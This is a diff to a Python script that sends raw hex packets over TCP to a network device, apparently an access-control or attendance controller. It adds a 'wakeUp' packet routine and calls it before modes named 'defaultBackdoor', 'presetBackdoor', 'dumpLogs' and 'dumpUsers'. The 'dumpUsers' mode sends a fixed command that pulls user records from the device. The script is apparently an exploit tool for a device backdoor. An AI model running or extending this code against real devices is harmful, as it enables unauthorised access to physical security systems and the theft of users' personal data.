@@ -26,13 +26,32 @@ def crcCalc(payload):
 #ID NUMBER = 5 bytes (10 binary code digits)
 
 
+def wakeUp(host,port):
+    socket.setdefaulttimeout(1.5)
+    tcp = socket.socket()
+    tcp.connect((host, port))
+    x=0
+    address = format(x, '#04x')[2:]
+    logging.debug('[+] Waking-Up: '+address)
+    pktz=bytes.fromhex(crcCalc(address+'4400'))#.lower()
+    logging.debug('[+] Wake-Up Packet to be sent: '+crcCalc(address+'4400').lower())
+    tcp.send(pktz)
+    dataz = tcp.recv(1024)
+    dataz.hex()
+    #print(binascii.hexlify(dataz))
+    tcp.close()
+    time.sleep(1)
+
+
 def dumpUsers(host,port):
     message='ff0a00480200003f85ff'
+    socket.setdefaulttimeout(6)
     mySocket = socket.socket()
     mySocket.connect((host, port))
     msg = bytes.fromhex(message)
     mySocket.send(msg)
     data = mySocket.recv(1024)
+    #time.sleep(5)
     data.hex()
     logging.debug('Received from server: ' + data.hex())
     #[TODO]: Add loop here that goes through the response and parses all the UserIDs and Usernames!
@@ -198,11 +217,14 @@ if __name__ == '__main__':
         logging.basicConfig(level=logging.INFO)
 
     if mode == 'default':
+        wakeUp(host,port)
         defaultBackdoor(host,port)
     elif mode == 'known':
+        wakeUp(host,port)
         presetBackdoor(host,port,template)
     elif mode == 'dumplogs':
+        wakeUp(host,port)
         dumpLogs(host,port,quantity)
     elif mode == 'dumpusers':
+        wakeUp(host,port)
         dumpUsers(host,port)
-
